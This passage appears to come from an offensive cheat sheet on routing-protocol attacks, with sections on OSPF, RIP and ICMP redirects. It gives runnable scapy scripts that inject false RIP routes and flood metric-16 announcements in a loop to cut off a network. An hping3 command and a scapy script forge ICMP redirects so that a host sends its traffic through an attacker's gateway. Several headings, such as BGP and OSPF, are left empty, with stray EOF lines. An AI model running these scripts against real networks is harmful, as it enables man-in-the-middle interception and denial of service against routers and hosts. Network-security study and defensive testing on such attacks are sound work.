# Spoof BGP packets to hijack session

EOF

## OSPF (Open Shortest Path First) Attacks

### OSPF Router Discovery
# OSPF uses multicast: 224.0.0.5 (All SPF Routers)

EOF

## RIP (Routing Information Protocol) Attacks

### RIP Reconnaissance
tcpdump -i eth0 'udp port 520'                                         # RIP uses UDP 520
tshark -i eth0 -Y "rip"                                                # RIP filter

### RIP Route Injection
# Send RIP response packets with false routes
python3 << 'EOF'
from scapy.all import *
rip = IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/RIPEntry(addr="10.0.0.0", mask="255.0.0.0", nextHop="192.168.1.50", metric=1)
send(rip)
EOF

### RIP Poisoning
# Send routes with metric 0 or 1
# Attract traffic to attacker
# Black hole or MITM

### RIP DoS
# Send routes with metric 16 (infinite)
# Cause route removal
python3 << 'EOF'
from scapy.all import *
rip = IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/RIPEntry(addr="10.0.0.0", mask="255.0.0.0", metric=16)
send(rip, loop=1)
EOF

## ICMP Redirect Attacks

### ICMP Redirect
# Send ICMP redirect to change routing table
hping3 -C 5 -K 1 -a 192.168.1.1 --icmp-gw 192.168.1.50 192.168.1.100  # ICMP redirect

python3 << 'EOF'
from scapy.all import *
# Redirect host to use attacker as gateway
redirect = IP(src="192.168.1.1", dst="192.168.1.100")/ICMP(type=5, code=1, gw="192.168.1.50")/IP(dst="8.8.8.8")/TCP()
send(redirect)
EOF

### ICMP Redirect Types
# Type 5, Code 0: Redirect for Network
# Type 5, Code 1: Redirect for Host
# Type 5, Code 2: Redirect for ToS and Network
# Type 5, Code 3: Redirect for ToS and Host
